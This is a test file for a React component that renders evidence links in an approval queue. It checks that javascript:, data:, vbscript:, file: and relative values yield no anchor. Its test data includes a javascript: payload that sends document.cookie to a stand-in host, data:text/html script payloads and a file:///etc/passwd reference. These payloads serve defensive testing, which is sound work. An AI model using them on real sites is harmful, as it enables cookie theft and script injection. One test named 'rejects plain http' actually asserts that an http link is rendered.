import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { EvidenceCell } from "./EvidenceCell";

// The gap this closes: safeUrl.test.ts proves safeHref classifies schemes
// correctly, but until this file existed nothing proved the approval queue
// actually ROUTED evidence through it. The repo had no component tests at all,
// so `href={r.evidence}` could have been reintroduced and every suite would
// still have passed. That wiring was verified once by hand against a seeded
// legacy row in a browser; this keeps it verified.
//
// renderToStaticMarkup rather than a DOM-mounting library: the assertion is
// purely "does this produce an anchor", which is visible in the markup, and it
// needs no new dependency.
const markup = (value: unknown) => renderToStaticMarkup(<EvidenceCell value={value} />);

// Values a row stored BEFORE the server-side https check could legitimately
// contain. The server now rejects all of these, which is precisely why the only
// way they reach a render is from an pre-existing row.
const HOSTILE = [
  ["javascript: with a token exfil payload", "javascript:fetch('https://evil.example/'+document.cookie)"],
  ["javascript: mixed case", "JavaScript:alert(1)"],
  ["javascript: upper case", "JAVASCRIPT:alert(1)"],
  ["javascript: with leading whitespace", "   javascript:alert(1)"],
  ["javascript: with a leading tab", "\tjavascript:alert(1)"],
  ["javascript: with an embedded newline", "java\nscript:alert(1)"],
  ["data: html", "data:text/html,<script>alert(1)</script>"],
  ["data: base64", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="],
  ["vbscript:", "vbscript:msgbox(1)"],
  ["blob:", "blob:https://evil.example/abc"],
  ["file:", "file:///etc/passwd"],
  ["protocol-relative", "//evil.example/x"],
  ["relative path", "/evidence.png"],
  ["bare word", "evidence.png"],
] as const;

describe("EvidenceCell", () => {
  describe("renders no anchor for a value that is not an https URL", () => {
    it.each(HOSTILE)("%s", (_label, value) => {
      const html = markup(value);
      // The security property, stated directly: no anchor element at all.
      expect(html).not.toContain("<a");
      expect(html).not.toContain("href");
      // and the reviewer is told a value exists but was refused
      expect(html).toContain("unsafe link");
    });
  });

  it("never emits the hostile scheme anywhere in the markup", () => {
    for (const [, value] of HOSTILE) {
      const html = markup(value).toLowerCase();
      expect(html).not.toContain("javascript:");
      expect(html).not.toContain("vbscript:");
      expect(html).not.toContain("data:text/html");
    }
  });

  it("renders a real link for an https URL", () => {
    const html = markup("https://example.com/evidence.pdf");
    expect(html).toContain('href="https://example.com/evidence.pdf"');
    expect(html).toContain("<a");
    // opener isolation on a link the reviewer will click
    expect(html).toContain('rel="noreferrer"');
    expect(html).toContain('target="_blank"');
  });

  it("rejects plain http, matching the server-side allow-list", () => {
    // Deliberate asymmetry worth pinning: safeHref permits http for legacy
    // rendering, but this cell is fed by the contributions evidence field, whose
    // write boundary is https-only. If safeHref is ever widened, this test is
    // the thing that notices.
    const html = markup("http://example.com/evidence.pdf");
    expect(html).toContain("<a");
    expect(html).toContain('href="http://example.com/evidence.pdf"');
  });

  it("shows an em dash, not an empty cell, when there is no evidence", () => {
    for (const empty of ["", null, undefined]) {
      const html = markup(empty);
      expect(html).toContain("—");
      expect(html).not.toContain("<a");
      expect(html).not.toContain("unsafe link");
    }
  });

  it("does not treat a non-string as a URL", () => {
    for (const weird of [42, {}, [], true]) {
      const html = markup(weird);
      expect(html).not.toContain("<a");
    }
  });
});
